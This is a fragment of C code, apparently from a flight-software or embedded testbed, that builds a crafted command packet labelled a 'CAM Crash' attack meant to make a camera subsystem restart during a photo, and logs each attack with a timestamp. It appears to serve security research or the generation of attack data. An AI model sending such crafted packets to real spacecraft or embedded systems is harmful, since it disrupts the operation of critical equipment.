    ...
    switch (CommandCode)
    {
        ...
        */
	    ...
	    OS_MutSemTake(CAM_AppData.data_mutex);
            ...
            //CAM CRASH (RESTART WHILE PHOTO) - TAGGED ON 8TH BYTE WITH 34
            //uint8_t buffer[] = {0x18,0xc8,0xc0,0x00,0x00,0x01,0x0c,0x00}; 
            uint8_t buffer2[] = {0x18,0x06,0xc0,0x00,0x00,0x15,0x06,0x22,0x43,0x41,0x4d,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
            ...
            printf("Executed CAM Crash attack\n");
            //fprintf(attack_log, "CAM Crash attack at : %lld \n", localtime.ticks);
            fprintf(attack_log, "CAM Crash attack at : %d.%06ld \n", packet_seconds, realtime.tv_nsec/1000);
            fflush(attack_log);    
